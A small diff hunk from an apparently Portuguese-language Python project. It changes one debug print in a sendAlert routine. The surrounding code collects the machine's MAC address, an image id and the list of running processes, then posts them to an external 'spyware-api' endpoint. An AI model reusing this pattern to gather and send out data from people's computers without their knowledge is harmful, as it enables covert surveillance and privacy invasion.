@@ -64,7 +64,7 @@ def sendAlert(self):
         dataAlert = json.dumps({"id": 0, "pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess(self)}, sort_keys=True, indent=4)
         alert = requests.post("https://spyware-api.herokuapp.com/alerta/save", dataAlert, headers=headers)
 
-        print(alert.text)
+        print(alert)
         print("Alert Saved")
         time.sleep(10)
     except Exception:
